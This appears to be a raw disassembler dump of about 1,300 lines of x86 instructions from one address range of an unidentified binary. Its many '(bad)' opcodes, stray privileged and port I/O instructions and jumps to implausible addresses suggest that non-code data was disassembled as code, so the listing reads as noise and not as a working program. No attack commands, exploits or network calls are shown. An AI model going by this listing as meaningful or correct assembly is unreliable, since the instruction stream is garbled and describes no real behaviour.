  448378:	dec    eax
  448379:	jmp    0xc267af05
  44837e:	(bad)  
  44837f:	mov    eax,ds:0xe704e248
  448384:	add    esi,esp
  448386:	(bad)  
  448387:	and    esp,DWORD PTR [ebx]
  448389:	std    
  44838a:	xchg   edx,eax
  44838b:	es add eax,0x3e69bdf
	...
  4483a9:	add    ah,dh
  4483ab:	pop    ebx
  4483ac:	clc    
  4483ad:	fld    TBYTE PTR [edi]
  4483af:	ror    DWORD PTR [ecx-0x26a5f712],1
  4483b5:	push   es
  4483b6:	(bad)  
  4483b7:	es (bad) 
  4483b9:	inc    BYTE PTR [ebx+ebx*8+0x1e3675ff]
  4483c0:	shr    cl,0xf7
  4483c3:	add    al,0x7c
  4483c5:	cld    
  4483c6:	loopne 0x448361
  4483c8:	mov    esi,0xbe83f353
  4483cd:	push   0x58
  4483cf:	or     al,0x7d
  4483d1:	push   ebx
  4483d2:	hlt    
  4483d3:	push   edi
  4483d4:	add    dl,BYTE PTR [ecx+0x46]
  4483d7:	aad    0xf8
  4483d9:	ds ss jecxz 0x4483be
  4483dd:	cmp    ah,BYTE PTR [edx]
  4483df:	fadd   QWORD PTR [esp+eiz*4-0x35bc2403]
  4483e6:	jbe    0x44842e
  4483e8:	sbb    eax,0x42c436eb
  4483ed:	repz test DWORD PTR [eax+eax*1],0x1d468ee9
  4483f5:	test   BYTE PTR [ecx+0x1b],0xff
  4483f9:	mov    ebx,0xe9f8db4a
  4483fe:	(bad)
  448403:	(bad)  
  448405:	push   0x53
  448407:	test   DWORD PTR [edx],0x7b59d855
  44840d:	inc    DWORD PTR [eax]
	...
  448427:	clc    
  448428:	pop    ebx
  448429:	inc    cl
  44842b:	push   es
  44842c:	in     eax,dx
  44842d:	mov    dl,0xbf
  44842f:	rcr    ebp,1
  448431:	mov    esp,0xf8dab7fc
  448436:	jmp    0xabcbaa5e
  44843b:	mov    bh,0xe0
  44843d:	add    esi,DWORD PTR [eax-0x49]
  448440:	pop    ecx
  448441:	fucomip st,st(6)
  448443:	je     0x448415
  448445:	or     ebx,DWORD PTR [ecx*4+0x1be1f759]
  44844c:	or     ch,al
  44844e:	add    BYTE PTR [ecx],ah
  448450:	shl    edi,cl
  448452:	dec    DWORD PTR [esi-0x7c]
  448455:	pshuflw xmm0,XMMWORD PTR [eax],0xe8
  44845a:	mov    ebx,esp
  44845c:	out    0xf7,eax
  44845e:	ret    
  44845f:	lds    edx,FWORD PTR [ebx+ebp*8-0x1]
  448463:	mov    edx,0x5c1a3e5b
  448468:	inc    ebx
  448469:	sbb    eax,DWORD PTR [ebx-0x3d05da70]
  44846f:	adc    al,BYTE PTR [edx+0x12]
  448472:	add    BYTE PTR [ebp+0x6],cl
  448475:	add    BYTE PTR [ebx-0x49f8daa0],cl
  44847b:	pop    ebp
  44847c:	pop    es
  44847d:	xor    eax,0x60dbf
  448482:	jg     0x4484a0
  448484:	mov    esi,0xe7eaf398
  448489:	jnp    0x448508
	...
  4484a3:	add    BYTE PTR [ebx],al
  4484a5:	add    DWORD PTR [esi+0x27],esi
  4484a8:	in     eax,0x33
  4484aa:	out    dx,al
  4484ab:	(bad)  
  4484ac:	cli    
  4484ad:	les    esi,FWORD PTR ds:0x5ddc0
  4484b3:	jl     0x44847c
  4484b5:	pop    esi
  4484b6:	mov    ebx,0x8101c7c1
  4484bb:	ror    DWORD PTR [esi-0x19],0x7
  4484bf:	and    DWORD PTR [edi+0x5e0b6dda],0xffffffef
  4484c6:	add    DWORD PTR [ebx+edx*8-0x43],esi
  4484ca:	sub    dh,dh
  4484cc:	jp     0x4484b6
  4484ce:	mov    ebx,0xf7d400e8
  4484d3:	call   DWORD PTR [esi]
  4484d5:	inc    ebx
  4484d6:	adc    al,BYTE PTR [ecx]
  4484d8:	shl    BYTE PTR [ebx],1
  4484da:	jnp    0x448521
  4484dc:	scas   al,BYTE PTR es:[edi]
  4484dd:	add    edi,DWORD PTR [ebx+0x628f4c7]
  4484e3:	add    ah,dh
  4484e5:	jmp    0x4484e3
  4484e7:	test   BYTE PTR [ecx],bh
  4484e9:	iret   
  4484ea:	sti    
  4484eb:	mov    cl,0x34
  4484ed:	in     eax,dx
  4484ee:	sub    DWORD PTR [ecx+0x78fcebf4],edi
  4484f4:	add    eax,0x63ed3584
  4484f9:	bound  eax,QWORD PTR [eax+0x6ae3027a]
  4484ff:	dec    esi
  448500:	pop    esp
  448501:	das    
  448502:	repnz clc 
  448504:	dec    ebx
  448505:	cs sub al,al
	...
  448520:	add    ah,dh
  448522:	jmp    0x448520
  448524:	jnp    0x4484d7
  448526:	push   esp
  448527:	mov    edi,0x75e71ebe
  44852c:	mov    esi,0x7cfc4c77
  448531:	push   ds
  448532:	iret   
  448533:	jno    0x448537
  448535:	or     al,0xb
  448537:	repnz clc 
  448539:	adc    ebp,DWORD PTR [esi]
  44853b:	xor    ch,0xf9
  44853e:	jo     0x448542
  448540:	call   0xf9295d6e
  448545:	aaa    
  448546:	outs   dx,BYTE PTR ds:[esi]
  448547:	out    0x9,eax
  448549:	imul   edi,DWORD PTR [esi+0x51f4f67f],0xd6dd7d08
  448553:	addr16 adc cl,ah
  448556:	scas   al,BYTE PTR es:[edi]
  448557:	out    dx,al
  448558:	clc    
  448559:	shr    DWORD PTR [ebx+0x30fbf580],cl
  44855f:	stc    
  448560:	jl     0x44851f
  448562:	(bad)  
  448563:	pusha  
  448564:	add    cl,ah
  448566:	pop    esi
  448567:	out    dx,eax
  448568:	clc    
  448569:	mov    bl,0xab
  44856b:	fistp  DWORD PTR [esi+eiz*4+0x3984e4a7]
  448572:	add    eax,0x243704fd
  448577:	inc    cx
  448579:	icebp  
  44857a:	add    ah,BYTE PTR [esi+0xec9bfb8]
  448580:	xchg   edx,eax
  448581:	sbb    al,0xe6
  448584:	add    eax,DWORD PTR [eax]
	...
  44859e:	hlt    
  44859f:	add    al,0xe7
  4485a1:	add    esi,esp
  4485a3:	add    al,0x83
  4485a5:	mov    eax,ds:0x1472d868
  4485aa:	hlt    
  4485ab:	add    al,0xc3
  4485ad:	mov    WORD PTR [eax-0x28],ds
  4485b0:	out    0x3,al
  4485b2:	hlt    
  4485b3:	add    al,0xe7
  4485b5:	add    esi,esp
  4485b7:	add    al,0x95
  4485b9:	cwde   
  4485ba:	inc    eax
  4485bb:	fcomp  DWORD PTR [esi]
  4485bd:	pop    ss
  4485be:	hlt    
  4485bf:	add    al,0x63
  4485c1:	xchg   ecx,eax
  4485c2:	xor    al,bl
  4485c4:	out    0x3,al
  4485c6:	hlt    
  4485c7:	add    al,0xe7
  4485c9:	add    esi,esp
  4485cb:	add    al,0x47
  4485cd:	fwait
  4485ce:	sbb    al,bl
  4485d0:	out    0x13,al
  4485d2:	hlt    
  4485d3:	add    al,0xb
  4485d5:	mov    WORD PTR [eax],cs
  4485d7:	fsub   st,st(6)
  4485d9:	add    esi,esp
  4485db:	add    al,0xe7
  4485dd:	add    esi,esp
  4485df:	add    al,0x9b
  4485e1:	mov    ah,0xf0
  4485e3:	xlat   BYTE PTR ds:[ebx]
  4485e4:	xchg   BYTE PTR [esi],dl
  4485e6:	hlt    
  4485e7:	add    al,0x13
  4485e9:	mov    eax,fs
  4485eb:	xlat   BYTE PTR ds:[ebx]
  4485ec:	out    0x3,al
  4485ee:	hlt    
  4485ef:	add    al,0xe7
  4485f1:	add    esi,esp
  4485f3:	add    al,0x85
  4485f5:	mov    ah,0xc8
  4485f7:	xlat   BYTE PTR ds:[ebx]
  4485f8:	ss pop ss
  4485fa:	hlt    
  4485fb:	add    al,0x1b
  4485fd:	lea    edi,[eax+0x3e6d7]
	...
  44861b:	hlt    
  44861c:	add    al,0x0
  44861e:	jmp    0xa9448b1a
  448623:	push   0x2b9f8d8
  448628:	add    eax,0xd87bed00
  44862d:	clc    
  44862e:	jmp    0xe9448b2a
  448633:	test   DWORD PTR [eax+eax*1],0xf8d84205
  44863a:	jno    0x448641
  44863c:	add    eax,0xd885b900
  448641:	clc    
  448642:	jmp    0xe9448b3e
  448647:	test   DWORD PTR [eax+eax*1],0xf8d88acd
  44864e:	test   edi,esp
  448650:	add    al,0x0
  448652:	mov    ecx,0xe9f8d872
  448657:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44865e:	fistp  WORD PTR [ebx-0x28]
  448661:	clc    
  448662:	sbb    eax,0xf5000504
  448667:	test   eax,ebx
  448669:	clc    
  44866a:	jmp    0xe9448b66
  44866f:	test   DWORD PTR [eax+eax*1],0xf8d8531b
  448676:	jno    0x44865f
  448678:	add    al,0x0
  44867a:	cmc    
  44867b:	sbb    cl,0xf8
  44867e:	jmp    0x448683
	...
  448697:	add    bh,dh
  448699:	add    al,0x0
  44869b:	jmp    0xdb448b97
  4486a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4486a1:	fprem  
  4486a3:	pop    ecx
  4486a4:	add    eax,DWORD PTR ds:0xd978a900
  4486aa:	clc    
  4486ab:	jmp    0x448ba7
  4486b0:	int    0x2
  4486b2:	add    BYTE PTR [eax],al
  4486b4:	jae    0x448649
  4486b6:	sti    
  4486b7:	jmp    DWORD PTR [ecx+0x1dfffff1]
  4486bd:	mov    ebx,edi
  4486bf:	dec    DWORD PTR [ebp-0x62fffffe]
  4486c5:	add    al,BYTE PTR [eax]
  4486c7:	add    ch,bl
  4486c9:	xchg   ebx,eax
  4486ca:	sti    
  4486cb:	inc    DWORD PTR [ecx-0xf]
  4486ce:	(bad)  
  4486cf:	(bad)  
  4486d0:	jge    0x448746
  4486d2:	sti    
  4486d3:	call   FWORD PTR [ebp+0x2]
  4486d6:	add    BYTE PTR [eax],al
  4486d8:	pop    ebp
  4486d9:	add    al,BYTE PTR [eax]
  4486db:	add    bl,bh
  4486dd:	xchg   ebx,eax
  4486de:	sti    
  4486df:	inc    ecx
  4486e1:	lock (bad) 
  4486e3:	jmp    DWORD PTR [ecx]
  4486e5:	mov    bl,bh
  4486e7:	call   FWORD PTR [ebp+0x2]
  4486ea:	add    BYTE PTR [eax],al
  4486ec:	dec    ebp
  4486ed:	add    al,BYTE PTR [eax]
  4486ef:	add    BYTE PTR [ecx-0x56],cl
  4486f2:	sti    
  4486f3:	jmp    DWORD PTR [ebp-0xc]
  4486f6:	(bad)  
  4486f7:	call   FWORD PTR ds:0x2
	...
  448715:	or     eax,0xd000002
  44871a:	add    al,BYTE PTR [eax]
  44871c:	add    BYTE PTR ds:0x1d000002,bl
  448722:	add    al,BYTE PTR [eax]
  448724:	add    bh,dh
  448726:	jl     0x448723
  448728:	push   DWORD PTR [ebx+0xbfffb7c]
  44872e:	jge    0x44872b
  448730:	jmp    ecx
  448732:	ins    DWORD PTR es:[edi],dx
  448733:	sti    
  448734:	inc    ebx
  448736:	outs   dx,BYTE PTR ds:[esi]
  448737:	sti    
  448738:	(bad)  
  448739:	out    dx,eax
  44873a:	ins    DWORD PTR es:[edi],dx
  44873b:	sti    
  44873c:	inc    DWORD PTR [ebx]
  44873e:	outs   dx,BYTE PTR ds:[esi]
  44873f:	sti    
  448740:	push   esp
  448742:	sub    edx,DWORD PTR [ecx-0x6f0a3c04]
  448748:	cld    
  448749:	mov    ebx,0xb3fc9147
  44874e:	pop    edi
  44874f:	xchg   edx,eax
  448750:	cld    
  448751:	stos   DWORD PTR es:[edi],eax
  448752:	mov    edx,DWORD PTR [ecx-0x6e8c5c04]
  448758:	cld    
  448759:	fwait
  44875a:	ja     0x4486ed
  44875c:	cld    
  44875d:	xchg   ebx,eax
  44875e:	fist   DWORD PTR [esi-0x69387404]
  448764:	cld    
  448765:	sub    DWORD PTR [edi+0x257bfc96],0xffffff96
  44876c:	cld    
  44876d:	jae    0x44875c
  44876f:	xchg   ebp,eax
  448770:	cld    
  448771:	imul   eax,DWORD PTR [ecx],0xffffff96
  448774:	cld    
  448775:	arpl   WORD PTR [ebx-0x69],bp
  448778:	cld    
	...
  448791:	add    BYTE PTR [ebx+0x59],bl
  448794:	xchg   edi,eax
  448795:	cld    
  448796:	push   ebx
  448797:	xchg   DWORD PTR [esi-0x68d8b404],edx
  44879d:	cld    
  44879e:	inc    ebx
  44879f:	daa    
  4487a0:	xchg   edi,eax
  4487a1:	cld    
  4487a2:	cmp    edx,DWORD PTR [edi]
  4487a4:	xchg   edi,eax
  4487a5:	cld    
  4487a6:	xor    edi,DWORD PTR [ebx+0x72bfc97]
  4487ac:	xchg   edi,eax
  4487ad:	cld    
  4487ae:	and    esp,edi
  4487b0:	xchg   edi,eax
  4487b1:	cld    
  4487b2:	sbb    ebx,DWORD PTR [ecx+0x7f13fc97]
  4487b8:	xchg   edi,eax
  4487b9:	cld    
  4487ba:	or     esi,DWORD PTR [edi-0x69]
  4487bd:	cld    
  4487be:	add    ebx,DWORD PTR [ebp-0x68]
  4487c1:	cld    
  4487c2:	sti    
  4487c3:	jmp    0xfca9:0x29f4fffc
  4487ca:	jmp    0x44880c
  4487cc:	test   eax,0xa96ae3fc
  4487d1:	cld    
  4487d2:	fild   DWORD PTR ds:0xd4d0b051
  4487d8:	cmp    dh,BYTE PTR [eax-0x4fd52b38]
  4487de:	rcl    ah,0x4
  4487e1:	mov    al,0xb8
  4487e3:	aam    0xa2
  4487e5:	mov    al,0xb0
  4487e7:	aam    0xe6
  4487e9:	add    esi,esp
  4487eb:	add    al,0x19
  4487ed:	mov    bl,0xa0
  4487ef:	aam    0x96
  4487f1:	mov    dl,0x98
  4487f3:	aam    0x24
  4487f5:	mov    bl,0x0
	...
  44880f:	nop
  448810:	aam    0x5a
  448812:	mov    dl,0x88
  448814:	aam    0x56
  448816:	mov    dl,0x80
  448818:	aam    0xd0
  44881a:	mov    dl,0x78
  44881c:	aam    0xcc
  44881e:	mov    dl,0x70
  448820:	aam    0xda
  448822:	mov    dl,0x68
  448824:	aam    0xe8
  448826:	mov    dl,0x60
  448828:	aam    0x6a
  44882a:	mov    dl,0x58
  44882c:	aam    0x56
  44882e:	mov    dl,0x50
  448830:	aam    0x46
  448832:	mov    dl,0x48
  448834:	aam    0x86
  448836:	mov    dl,0x40
  448838:	aam    0xc4
  44883a:	mov    dl,0x38
  44883c:	aam    0x68
  44883e:	mov    dl,0x30
  448840:	aam    0xe6
  448842:	add    esi,esp
  448844:	add    al,0xa1
  448846:	scas   al,BYTE PTR es:[edi]
  448847:	and    ah,dl
  448849:	out    0x3,al
  44884b:	hlt    
  44884c:	add    al,0xb5
  44884e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44884f:	adc    ah,dl
  448851:	test   BYTE PTR [eax+ecx*1+0xa49ad4],ah
  448858:	aam    0x58
  44885a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44885b:	clc    
  44885c:	ror    DWORD PTR [edx-0x5b],cl
  44885f:	lock sar DWORD PTR [edx],cl
  448862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448863:	call   0x9965883b
  448868:	sar    al,1
  44886a:	std    
  44886b:	nop
  44886c:	sar    al,1
  44886e:	jmp    0xf03d5908
	...
  44888b:	add    BYTE PTR [ebp-0x69f00730],dl
  448891:	sar    al,1
  448893:	setbe  al
  448896:	clc    
  448897:	and    edx,DWORD PTR [esi-0x30]
  44889a:	clc    
  44889b:	inc    edi
  44889c:	push   esi
  44889d:	sar    al,1
  44889f:	cmp    edx,DWORD PTR [esi-0x30]
  4488a2:	clc    
  4488a3:	imul   edx,DWORD PTR [ebp-0x30],0xd05577f8
  4488aa:	clc    
  4488ab:	jg     0x448902
  4488ad:	sar    al,1
  4488af:	push   ecx
  4488b0:	push   ebp
  4488b1:	sar    al,1
  4488b3:	lahf   
  4488b4:	push   ebp
  4488b5:	sar    al,1
  4488b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4488b8:	xchg   ebp,eax
  4488b9:	sar    al,1
  4488bb:	(bad)  
  4488bc:	xchg   ebp,eax
  4488bd:	sar    al,1
  4488bf:	jmp    0xce3d595a
  4488c4:	xchg   esi,eax
  4488c5:	sar    al,1
  4488c7:	and    DWORD PTR [edi-0x69460730],edx
  4488cd:	sar    al,1
  4488cf:	ret    
  4488d0:	xchg   esi,eax
  4488d1:	sar    al,1
  4488d3:	gs xchg esi,eax
  4488d5:	sar    al,1
  4488d7:	pop    ebp
  4488d8:	push   esi
  4488d9:	sar    al,1
  4488db:	test   DWORD PTR [esi-0x30],edx
  4488de:	clc    
  4488df:	jae    0x448937
  4488e1:	sar    al,1
  4488e3:	sbb    edx,DWORD PTR [esi-0x30]
  4488e6:	clc    
  4488e7:	or     DWORD PTR [esi-0x30],edx
  4488ea:	clc    
  4488eb:	sbb    DWORD PTR [esi-0x30],edx
  4488ee:	clc    
  4488ef:	pop    ss
	...
  448908:	add    BYTE PTR [esi-0x30],dl
  44890b:	clc    
  44890c:	fstp   QWORD PTR [ebx-0x30]
  44890f:	clc    
  448910:	add    BYTE PTR [ebp-0x5400048e],bh
  448916:	test   eax,0x8809fffb
  44891b:	sti    
  44891c:	inc    DWORD PTR [ecx+0x2bfffb72]
  448922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448923:	sti    
  448924:	call   DWORD PTR [ecx-0x5b]
  448927:	sti    
  448928:	(bad)  
  448929:	cmp    eax,0x4bfffba5
  44892e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44892f:	sti    
  448930:	jmp    FWORD PTR ds:0x51fffba5
  448936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448937:	sti    
  448938:	(bad)  
  448939:	jge    0x4488e0
  44893b:	sti    
  44893c:	jmp    FWORD PTR [ebp+0x6ffffba5]
  448942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448943:	sti    
  448944:	call   DWORD PTR [ebx-0x7800048d]
  44894a:	jae    0x448947
  44894c:	call   FWORD PTR [edi+0x29fffb73]
  448952:	jb     0x44894f
  448954:	dec    DWORD PTR [ecx]
  448956:	jb     0x448953
  448958:	push   ebp
  44895a:	jno    0x448957
  44895c:	call   FWORD PTR [edi+0x73]
  44895f:	sti    
  448960:	(bad)  
  448961:	fnsave [ecx-0x5]
  448964:	dec    ebp
  448966:	jno    0x448963
  448968:	push   DWORD PTR [ecx+0x72]
  44896b:	sti    
  44896c:	inc    DWORD PTR [eax]
	...
  448986:	popa   
  448987:	jb     0x448984
  448989:	jmp    ebp
  44898b:	jno    0x448988
  44898d:	inc    DWORD PTR [ebx]
  44898f:	jb     0x44898c
  448991:	jmp    DWORD PTR [ecx-0x62]
  448994:	sti    
  448995:	inc    DWORD PTR [ebp+0x61fffb9e]
  44899b:	sahf   
  44899c:	sti    
  44899d:	call   DWORD PTR ds:0xf4fffb9e
  4489a3:	mov    ebp,0xcbfbfca4
  4489a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4489a9:	cld    
  4489aa:	repz in eax,0x9d
  4489ad:	cld    
  4489ae:	jmp    0x448965
  4489b0:	popf   
  4489b1:	cld    
  4489b2:	jecxz  0x44899d
  4489b4:	popf   
  4489b5:	cld    
  4489b6:	fcmovnu st,st(7)
  4489b8:	pushf  
  4489b9:	cld    
  4489ba:	sar    DWORD PTR [edi-0x60340364],cl
  4489c0:	pushf  
  4489c1:	cld    
  4489c2:	ret    
  4489c3:	outs   dx,DWORD PTR ds:[esi]
  4489c4:	pushf  
  4489c5:	cld    
  4489c6:	mov    ebx,0xb3fc9d53
  4489cb:	pop    ebp
  4489cc:	popf   
  4489cd:	cld    
  4489ce:	stos   DWORD PTR es:[edi],eax
  4489cf:	inc    edi
  4489d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4489d1:	cld    
  4489d2:	mov    ds:0x9bfca3f1,eax
  4489d7:	and    esp,DWORD PTR [esp+edi*8-0x3631c6d]
  4489de:	mov    esi,DWORD PTR [ebx-0x307c0364]
  4489e4:	pushf  
  4489e5:	cld    
  4489e6:	jnp    0x4489d1
  4489e8:	pushf  
  4489e9:	cld    
	...
  448a02:	add    BYTE PTR [ebx-0x7b],dh
  448a05:	cmp    esp,0x6b
  448a08:	xchg   DWORD PTR [ebx-0x7c8c9c04],eax
  448a0e:	cld    
  448a0f:	pop    ebx
  448a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448a11:	cmp    esp,0x53
  448a14:	jno    0x448999
  448a16:	cld    
  448a17:	dec    ebx
  448a18:	jge    0x44899d
  448a1a:	cld    
  448a1b:	inc    ebx
  448a1c:	dec    ebp
  448a1d:	test   ah,bh
  448a1f:	cmp    eax,ecx
  448a21:	cmp    esp,0x33
  448a24:	xchg   ecx,eax
  448a25:	cmp    esp,0x2b
  448a28:	mov    ebp,0xa723fc83
  448a2d:	cmp    esp,0x1b
  448a30:	fild   WORD PTR [ebx-0x32fbec04]
  448a36:	test   BYTE PTR [eax],cl
  448a38:	sar    esp,1
  448a3a:	test   BYTE PTR [eax],al
  448a3c:	rcr    esp,1
  448a3e:	test   al,bh
  448a40:	ror    BYTE PTR [eax*4-0x60412f10],1
  448a47:	call   0xe0c9931c
  448a4c:	shr    BYTE PTR [eax],1
  448a4e:	test   eax,ebx
  448a50:	shl    BYTE PTR [edx],1
  448a52:	test   eax,edx
  448a54:	rol    BYTE PTR [edx+eax*4-0x7d8b2f38],1
  448a5b:	rcl    al,0x64
  448a5e:	cmp    BYTE PTR [eax-0x4f7daf30],0xd0
  448a65:	sbb    BYTE PTR [edx+0x0],al
	...
  448a7f:	add    BYTE PTR [eax-0x5f7ddd30],ch
  448a85:	sar    dl,1
  448a87:	sbb    DWORD PTR [eax-0x6f7e0130],0x8881fad0
  448a91:	shl    al,1
  448a93:	add    DWORD PTR [eax+0x78818ed0],0x70817ed0
  448a9d:	shl    BYTE PTR [edx-0x692f977f],1
  448aa3:	and    DWORD PTR [eax-0x30],0xd058812e
  448aaa:	cmp    al,BYTE PTR [ecx-0x7e872fb0]
  448ab0:	dec    eax
  448ab1:	rcr    ah,1
  448ab3:	add    BYTE PTR [eax-0x30],0xc4
  448ab7:	cmp    BYTE PTR [eax],0xd0
  448aba:	mov    al,0x80
  448abc:	xor    al,dl
  448abe:	lods   al,BYTE PTR ds:[esi]
  448abf:	sub    BYTE PTR [eax],0xd0
  448ac2:	repnz and BYTE PTR [eax],0xd0
  448ac6:	dec    DWORD PTR [edx]
  448ac8:	jne    0x448a9b
  448aca:	clc    
  448acb:	fbstp  TBYTE PTR [ecx+edx*8-0x8]
  448acf:	sbb    DWORD PTR [ecx+edx*8-0x8],esi
  448ad3:	or     DWORD PTR [ecx+edx*8-0x8],esi
  448ad7:	and    esi,DWORD PTR [ecx+edx*8-0x8]
  448adb:	push   ecx
  448adc:	je     0x448aae
  448ade:	clc    
  448adf:	push   ebx
  448ae0:	je     0x448ab2
  448ae2:	clc    
  448ae3:	arpl   WORD PTR [eax],ax
	...
  448afd:	je     0x448acf
  448aff:	clc    
  448b00:	arpl   WORD PTR [eax+edx*8-0x8],si
  448b04:	mov    ch,0x53
  448b06:	sar    eax,1
  448b08:	gs je  0x448adb
  448b0b:	clc    
  448b0c:	dec    ebp
  448b0d:	je     0x448adf
  448b0f:	clc    
  448b10:	aas    
  448b11:	je     0x448ae3
  448b13:	clc    
  448b14:	daa    
  448b15:	je     0x448ae7
  448b17:	clc    
  448b18:	sub    eax,0xe9f8d05c
  448b1d:	test   DWORD PTR [eax+eax*1],0xf8d07efb
  448b24:	iret   
  448b25:	outs   dx,BYTE PTR ds:[esi]
  448b26:	sar    al,1
  448b28:	cmc    
  448b29:	outs   dx,BYTE PTR ds:[esi]
  448b2a:	sar    al,1
  448b2c:	jmp    0xef449028
  448b31:	test   DWORD PTR [eax+eax*4],0x8004f7e1
  448b38:	jmp    0x448b31
  448b3a:	add    al,0x80
  448b3c:	lock test DWORD PTR [eax+eax*4],0x4f7e9
  448b44:	pop    ebx
  448b45:	push   0x60e5f8d0
  448b4a:	sar    al,1
  448b4c:	shr    DWORD PTR [eax-0x30],1
  448b4f:	clc    
  448b50:	jmp    0xa744904c
  448b55:	mov    al,dl
  448b57:	clc    
  448b58:	add    BYTE PTR [ebx],ch
  448b5a:	js     0x448b57
  448b5c:	call   DWORD PTR [ebx]
  448b5e:	add    eax,DWORD PTR [eax]
  448b60:	add    BYTE PTR [eax],0x0
	...
  448b77:	add    BYTE PTR [eax],al
  448b79:	add    cl,dh
  448b7b:	jns    0x448b78
  448b7d:	(bad)  
  448b7e:	(bad)  
  448b7f:	jns    0x448b7c
  448b81:	dec    DWORD PTR [ebx]
  448b83:	js     0x448b80
  448b85:	inc    DWORD PTR [edi]
  448b87:	js     0x448b84
  448b89:	(bad)  
  448b8a:	(bad)  [ebx-0x5]
  448b8d:	(bad)  
  448b8e:	push   DWORD PTR [ecx-0x5]
  448b91:	dec    DWORD PTR [ecx]
  448b93:	jb     0x448b90
  448b95:	call   FWORD PTR [ebx]
  448b97:	jb     0x448b94
  448b99:	jmp    DWORD PTR ds:0x11fffb72
  448b9f:	jb     0x448b9c
  448ba1:	push   DWORD PTR [ebp+0x79]
  448ba4:	sti    
  448ba5:	dec    DWORD PTR [edi+0x79]
  448ba8:	sti    
  448ba9:	call   FWORD PTR ds:0x3dfffb79
  448baf:	jns    0x448bac
  448bb1:	jmp    ebx
  448bb3:	js     0x448bb0
  448bb5:	jmp    FWORD PTR [ebx-0x1000048e]
  448bbb:	js     0x448bb8
  448bbd:	jmp    FWORD PTR [ebx-0x6400048e]
  448bc3:	jb     0x448bc0
  448bc5:	call   FWORD PTR [edi-0x6c]
  448bc8:	sti    
  448bc9:	jmp    FWORD PTR [ebx-0x6c]
  448bcc:	sti    
  448bcd:	jmp    DWORD PTR [edi-0x6600046c]
  448bd3:	xchg   esp,eax
  448bd4:	sti    
  448bd5:	push   DWORD PTR [ebx+0x4dfffb93]
  448bdb:	add    al,BYTE PTR [eax]
	...
  448bf5:	add    BYTE PTR [eax],al
  448bf7:	adc    esi,DWORD PTR [edx-0x5]
  448bfa:	call   FWORD PTR [ebp+0x2]
  448bfd:	add    BYTE PTR [eax],al
  448bff:	cmp    DWORD PTR [ebx-0x720b0005],ebx
  448c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448c06:	cld    
  448c07:	xor    esp,DWORD PTR [esi+0x42bfca5]
  448c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448c0e:	cld    
  448c0f:	and    esi,edx
  448c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448c12:	cld    
  448c13:	sbb    esi,DWORD PTR [edx-0x51ec035b]
  448c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448c1a:	cld    
  448c1b:	or     esp,DWORD PTR [esi]
  448c1d:	lods   al,BYTE PTR ds:[esi]
  448c1e:	cld    
  448c1f:	add    edi,esi
  448c21:	stos   DWORD PTR es:[edi],eax
  448c22:	cld    
  448c23:	sti    
  448c24:	sti    
  448c25:	stos   DWORD PTR es:[edi],eax
  448c26:	cld    
  448c27:	repz or ebp,DWORD PTR [esp+edi*8-0x35ad215]
  448c2f:	jecxz  0x448c62
  448c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448c32:	cld    
  448c33:	fist   DWORD PTR [edi]
  448c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448c36:	cld    
  448c37:	shl    DWORD PTR [ecx],cl
  448c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448c3a:	cld    
  448c3b:	retf   
  448c3c:	lea    esp,[ebp-0x5a403c04]
  448c42:	cld    
  448c43:	mov    ebx,0xb3fca5ad
  448c48:	in     eax,0xaa
  448c4a:	cld    
  448c4b:	stos   DWORD PTR es:[edi],eax
  448c4c:	lods   eax,DWORD PTR ds:[esi]
  448c4d:	stos   BYTE PTR es:[edi],al
  448c4e:	cld    
  448c4f:	mov    ds:0x9bfcaa07,eax
  448c54:	retf   
  448c55:	stos   BYTE PTR es:[edi],al
  448c56:	cld    
  448c57:	xchg   ebx,eax
  448c58:	fild   QWORD PTR [edx+0xfc]
	...
  448c72:	add    BYTE PTR [eax],al
  448c74:	mov    ebp,ebp
  448c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448c77:	cld    
  448c78:	add    DWORD PTR [ecx-0x56],0xfffffffc
  448c7c:	jnp    0x448c7b
  448c7e:	test   eax,0xa9f773fc
  448c83:	cld    
  448c84:	imul   ebx,DWORD PTR [edi-0x55],0xfffffffc
  448c88:	arpl   WORD PTR [ecx],bp
  448c8a:	stos   DWORD PTR es:[edi],eax
  448c8b:	cld    
  448c8c:	pop    ebx
  448c8d:	xor    eax,0xb53fcab
  448c92:	stos   DWORD PTR es:[edi],eax
  448c93:	cld    
  448c94:	dec    ebx
  448c95:	add    al,0x27
  448c97:	lods   eax,DWORD PTR ds:[esi]
  448c98:	inc    eax
  448c99:	int    0x34
  448c9b:	lods   eax,DWORD PTR ds:[esi]
  448c9c:	cmp    ch,cl
  448c9e:	dec    edx
  448c9f:	lods   eax,DWORD PTR ds:[esi]
  448ca0:	xor    ch,cl
  448ca2:	push   eax
  448ca3:	lods   eax,DWORD PTR ds:[esi]
  448ca4:	sub    ch,cl
  448ca6:	in     al,dx
  448ca7:	lods   al,BYTE PTR ds:[esi]
  448ca8:	and    ch,cl
  448caa:	fisubr WORD PTR [eax+ebx*1+0x10af4ecd]
  448cb1:	int    0x5e
  448cb3:	scas   eax,DWORD PTR es:[edi]
  448cb4:	or     ch,cl
  448cb6:	call   0xf8af:0x80cd00af
  448cbd:	int3   
  448cbe:	mov    ah,0xaf
  448cc0:	lock int3 
  448cc2:	sahf   
  448cc3:	scas   eax,DWORD PTR es:[edi]
  448cc4:	call   0xe0f44595
  448cc9:	int3   
